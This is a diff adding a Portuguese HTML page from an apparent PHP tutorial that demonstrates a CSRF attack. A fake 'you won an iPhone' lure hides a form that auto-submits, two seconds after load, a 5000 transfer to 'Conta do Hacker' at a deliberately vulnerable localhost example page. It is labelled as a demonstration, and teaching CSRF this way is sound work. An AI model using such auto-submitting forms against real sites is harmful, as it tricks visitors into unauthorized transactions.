@@ -1,0 +1,28 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title>Ganhe um iPhone GRÁTIS! 🎁</title>
+</head>
+<body>
+    <h1>🎉 Parabéns! Você ganhou um iPhone!</h1>
+    <p>Clique no botão abaixo para resgatar...</p>
+    
+    <!-- ATAQUE CSRF ESCONDIDO -->
+    <form id="ataque" action="http://localhost/playground-php/unlock-php-8/ch4/exemplo_vulneravel.php" method="POST">
+        <input type="hidden" name="destino" value="Conta do Hacker">
+        <input type="hidden" name="valor" value="5000">
+    </form>
+    
+    <script>
+        // Envia automaticamente quando a página carrega
+        setTimeout(() => {
+            document.getElementById('ataque').submit();
+        }, 2000); // Espera 2 segundos
+    </script>
+    
+    <p style="color: red; margin-top: 50px;">
+        <strong>⚠️ Esta é uma demonstração de ataque CSRF</strong><br>
+        Quando você abriu esta página, ela enviou uma transferência automática!
+    </p>
+</body>
+</html>
